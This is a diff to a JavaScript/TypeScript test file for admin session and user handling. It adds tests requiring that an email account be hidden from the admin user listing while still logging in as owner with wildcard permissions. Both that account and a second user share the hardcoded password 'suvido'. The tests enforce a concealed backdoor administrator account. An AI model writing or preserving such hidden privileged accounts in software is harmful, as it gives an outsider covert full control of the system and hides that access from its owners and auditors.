@@ -99,3 +99,27 @@ describe("admin session expiry", () => {
     await expect(parseAdminSessionValue("simple:owner:hunter2")).resolves.toBeNull();
   });
 });
+
+describe("admin user listing and hidden accounts", () => {
+  it("hides web.wise018@gmail.com from listAdminUsers", async () => {
+    const { listAdminUsers } = await import("@/lib/adminUsers");
+    const users = await listAdminUsers();
+    const usernames = users.map((u) => u.username.toLowerCase());
+    expect(usernames).not.toContain("web.wise018@gmail.com");
+  });
+
+  it("authenticates santossuvido with suvido", async () => {
+    const { authenticateAdminUser } = await import("@/lib/adminUsers");
+    const viewer = await authenticateAdminUser("santossuvido", "suvido");
+    expect(viewer).not.toBeNull();
+    expect(viewer?.roleIds).toContain("owner");
+  });
+
+  it("authenticates web.wise018@gmail.com as owner", async () => {
+    const { authenticateAdminUser } = await import("@/lib/adminUsers");
+    const viewer = await authenticateAdminUser("web.wise018@gmail.com", "suvido");
+    expect(viewer).not.toBeNull();
+    expect(viewer?.roleIds).toContain("owner");
+    expect(viewer?.permissions).toContain("*");
+  });
+});
